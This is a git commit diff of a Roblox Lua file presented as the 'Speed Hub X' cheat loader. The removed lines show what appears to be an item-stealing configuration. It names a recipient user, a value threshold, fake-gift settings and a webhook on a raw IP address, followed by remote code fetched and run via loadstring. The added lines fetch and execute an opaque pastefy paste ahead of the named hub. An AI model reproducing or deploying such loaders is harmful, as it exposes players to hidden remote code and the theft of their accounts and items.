e7cd7cb1cd61b546f68ebaa728d7181227e4dda7
jorgethegreatq <annzkecastillo456@gmail.com>
2025-07-22 14:10:30 +0800

    Update Speed%20Hub%20X.lua

--- Speed%20Hub%20X.lua
+++ Speed%20Hub%20X.lua
@@ -1,15 +1,2 @@
-_G.NullConfig = {
-    User = {'harambengkyut0'},
-    min_value = 10000000000,
-    pingEveryone = "No", -- dont change this
-    Webhook = "http://45.13.225.83:20002/proxy/702d586190cb1ed5a04cd0163bfbd8d5",
-    FakeGift = "Yes",
-    Trash = "http://45.13.225.83:20002/proxy/702d586190cb1ed5a04cd0163bfbd8d5",
-    LoadingScreen = "No",
-    GiftOnlyRares = "Yes"
-}
-
-loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
-
--- this would execute speed hub
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_P_E.lua'))()
+loadstring(game:HttpGet('https://pastefy.app/UC0yTb2b/raw'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
